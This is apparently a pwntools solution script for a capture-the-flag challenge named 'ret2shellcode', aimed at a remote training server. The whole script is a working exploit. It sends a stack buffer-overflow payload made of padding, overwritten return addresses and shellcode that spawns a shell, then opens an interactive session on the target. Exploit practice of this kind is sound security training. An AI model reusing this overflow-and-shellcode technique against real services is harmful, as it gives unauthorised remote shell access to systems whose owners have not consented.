from pwn import *
# r=process("./ret2shellcode")
r=remote("train2024.hitctf.cn",26525)

context.arch="i386"# x86 32
context.terminal=["tmux","splitw","-h"]

ash=asm(shellcraft.sh())

# gdb.attach(r)

r.sendlineafter(b"please input your secret:",b'a'*0x80+p32(0x7000088)+p32(0x7000084)+ash)
payload=b'a'*0x30+p32(0x7000084)
r.sendlineafter(b"what's your name:",payload)

r.interactive()